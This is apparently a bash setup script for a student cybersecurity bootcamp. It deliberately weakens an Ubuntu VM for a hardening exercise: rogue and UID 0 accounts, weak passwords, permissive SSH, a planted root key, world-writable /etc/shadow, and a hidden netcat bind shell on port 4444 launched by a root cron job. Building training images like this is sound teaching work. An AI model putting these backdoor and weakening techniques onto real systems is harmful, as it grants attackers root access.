#!/bin/bash
# =============================================================================
# HBA CyberEagles Bootcamp - Day 2 Linux Image - Vulnerability Planting Script
#
# Run this on a clean Ubuntu 22.04 VM as root BEFORE running aeacus release.
# It plants all the vulnerabilities that scoring.conf checks for.
#
# Usage: sudo bash PlantVulns.sh
#
# MANUAL STEPS STILL REQUIRED AFTER THIS SCRIPT:
#   1. Copy scoring.conf to /opt/aeacus/scoring.conf
#   2. Copy HintLadder.sh to /opt/aeacus/HintLadder.sh and chmod +x
#   3. Create a Desktop launcher for HintLadder.sh
#   4. Copy ReadMe.conf to /opt/aeacus/ReadMe.conf (edit the template first!)
#   5. Copy logo.png to /opt/aeacus/assets/img/
#   6. Run: /opt/aeacus/aeacus --verbose check  (verify all vulns score 0)
#   7. Run: sudo grep '^bkahale:' /etc/shadow  and paste the hash into scoring.conf
#   8. Run: /opt/aeacus/aeacus --verbose release
# =============================================================================

set -e

if [ "$(id -u)" -ne 0 ]; then
    echo "ERROR: Run this script as root (sudo bash PlantVulns.sh)"
    exit 1
fi

echo "=== HBA Day 2 Linux Image - Planting Vulnerabilities ==="
echo ""

# -------------------------------------------------------
# FORENSICS QUESTIONS
# -------------------------------------------------------
echo "[1/17] Creating forensics question files on Desktop..."
DESKTOP="/home/cpadmin/Desktop"
if [ ! -d "$DESKTOP" ]; then
    echo "WARNING: $DESKTOP does not exist. Is the user 'cpadmin' created?"
    echo "Create the cpadmin user first, log in once (to generate Desktop), then re-run."
    exit 1
fi

cat > "$DESKTOP/Forensics Question 1.txt" <<'FEOF'
A backdoor listener was installed on this machine. What TCP port
does it listen on?

ANSWER:
FEOF

cat > "$DESKTOP/Forensics Question 2.txt" <<'FEOF'
One user account on this machine does not belong to any authorized
user in the README. What is its username?

ANSWER:
FEOF

chown cpadmin:cpadmin "$DESKTOP/Forensics Question 1.txt" "$DESKTOP/Forensics Question 2.txt"

# -------------------------------------------------------
# ACCOUNT MANAGEMENT
# -------------------------------------------------------
echo "[2/17] Creating unauthorized user 'hacker'..."
useradd -m hacker 2>/dev/null || echo "  (hacker may already exist)"
echo 'hacker:P@ssw0rd' | chpasswd

echo "[3/17] Creating hidden root-level account 'toor' (UID 0)..."
useradd -o -u 0 -g 0 -M -s /bin/bash toor 2>/dev/null || echo "  (toor may already exist)"
echo 'toor:toor' | chpasswd

echo "[4/17] Creating authorized user 'jdoe' and adding to sudo group..."
useradd -m jdoe 2>/dev/null || echo "  (jdoe may already exist)"
echo 'jdoe:Str0ngP@ss!' | chpasswd
usermod -aG sudo jdoe

echo "[5/17] Creating NOPASSWD sudoers entry for jdoe..."
echo 'jdoe ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/91-jdoe
chmod 440 /etc/sudoers.d/91-jdoe

echo "[6/17] Creating authorized user 'mkealoha'..."
useradd -m mkealoha 2>/dev/null || echo "  (mkealoha may already exist)"
echo 'mkealoha:Aloha2026!' | chpasswd

echo "[7/17] Creating authorized user 'bkahale' with weak password 'password'..."
useradd -m bkahale 2>/dev/null || echo "  (bkahale may already exist)"
echo 'bkahale:password' | chpasswd

# -------------------------------------------------------
# SSH HARDENING VULNS
# -------------------------------------------------------
echo "[8/17] Weakening SSH config (PermitRootLogin yes, PermitEmptyPasswords yes)..."
SSHD_CONF="/etc/ssh/sshd_config"
# Remove existing directives and add insecure ones
sed -i '/^\s*PermitRootLogin\b/d' "$SSHD_CONF"
sed -i '/^\s*PermitEmptyPasswords\b/d' "$SSHD_CONF"
echo "PermitRootLogin yes" >> "$SSHD_CONF"
echo "PermitEmptyPasswords yes" >> "$SSHD_CONF"
systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null || true

echo "[9/17] Planting unauthorized SSH key in /root/.ssh/..."
mkdir -p /root/.ssh
# Generate a throwaway key pair just for the image
ssh-keygen -t ed25519 -f /tmp/plant_key -N "" -q -C "planted-key" 2>/dev/null || true
cat /tmp/plant_key.pub > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
rm -f /tmp/plant_key /tmp/plant_key.pub

# -------------------------------------------------------
# FILE PERMISSIONS
# -------------------------------------------------------
echo "[10/17] Making /etc/shadow world-readable (chmod 666)..."
chmod 666 /etc/shadow

# -------------------------------------------------------
# PROHIBITED SERVICES
# -------------------------------------------------------
echo "[11/17] Installing vsftpd (FTP server, not authorized by README)..."
DEBIAN_FRONTEND=noninteractive apt-get install -y vsftpd >/dev/null 2>&1
systemctl enable vsftpd 2>/dev/null || true
systemctl start vsftpd 2>/dev/null || true

# -------------------------------------------------------
# PROHIBITED SOFTWARE
# -------------------------------------------------------
echo "[12/17] Installing prohibited tools (john, nmap)..."
DEBIAN_FRONTEND=noninteractive apt-get install -y john nmap >/dev/null 2>&1

# -------------------------------------------------------
# BACKDOOR - Cron job + binary
# -------------------------------------------------------
echo "[13/17] Planting backdoor binary and cron job..."
# Copy nc to a hidden location
if command -v nc >/dev/null 2>&1; then
    cp "$(command -v nc)" /var/tmp/.cache-nc
elif command -v ncat >/dev/null 2>&1; then
    cp "$(command -v ncat)" /var/tmp/.cache-nc
else
    # Install netcat if not present, then copy
    DEBIAN_FRONTEND=noninteractive apt-get install -y netcat-openbsd >/dev/null 2>&1
    cp "$(command -v nc)" /var/tmp/.cache-nc
fi
chmod +x /var/tmp/.cache-nc

# Create the malicious cron job
cat > /etc/cron.d/updater <<'CEOF'
* * * * * root /var/tmp/.cache-nc -l -p 4444 -e /bin/bash
CEOF
chmod 644 /etc/cron.d/updater

# -------------------------------------------------------
# MEDIA FILE
# -------------------------------------------------------
echo "[14/17] Planting media file..."
MUSIC_DIR="/home/cpadmin/Music"
mkdir -p "$MUSIC_DIR"
# Create a tiny file with .mp3 extension
printf '\xff\xfb\x90\x00' > "$MUSIC_DIR/lahaina_remix.mp3"
chown -R cpadmin:cpadmin "$MUSIC_DIR"

# -------------------------------------------------------
# FIREWALL (ensure ufw is installed but inactive)
# -------------------------------------------------------
echo "[15/17] Ensuring ufw is installed but inactive..."
DEBIAN_FRONTEND=noninteractive apt-get install -y ufw >/dev/null 2>&1
ufw disable 2>/dev/null || true

# -------------------------------------------------------
# AEACUS + HINT LADDER SETUP
# -------------------------------------------------------
echo "[16/17] Creating /opt/aeacus directory structure..."
mkdir -p /opt/aeacus/assets/img

echo "[17/17] Installing zenity for hint ladder GUI..."
DEBIAN_FRONTEND=noninteractive apt-get install -y zenity >/dev/null 2>&1

# -------------------------------------------------------
# SUMMARY
# -------------------------------------------------------
echo ""
echo "Done planting vulnerabilities!"
echo ""
echo "=== MANUAL STEPS REMAINING ==="
echo "  1. Download aeacus release from GitHub and extract to /opt/aeacus/"
echo "  2. Copy scoring.conf -> /opt/aeacus/scoring.conf"
echo "  3. Copy HintLadder.sh -> /opt/aeacus/HintLadder.sh && chmod +x"
echo "  4. Create Desktop launcher for HintLadder.sh"
echo "  5. Copy ReadMe.conf -> /opt/aeacus/ReadMe.conf (edit template first!)"
echo "  6. Copy logo.png -> /opt/aeacus/assets/img/"
echo "  7. Run:  /opt/aeacus/aeacus --verbose check"
echo "  8. Run:  sudo grep '^bkahale:' /etc/shadow"
echo "     Paste the \$6\$... hash into scoring.conf line 100 (the 'value' field)"
echo "  9. Run:  /opt/aeacus/aeacus --verbose readme"
echo " 10. Verify scoring report shows 0/100, then:"
echo "     Run:  /opt/aeacus/aeacus --verbose release"
echo ""
echo "NOTE: The backdoor cron job is LIVE (nc listening on 4444)."
echo "This is intentional — it's the forensics Q1 evidence."
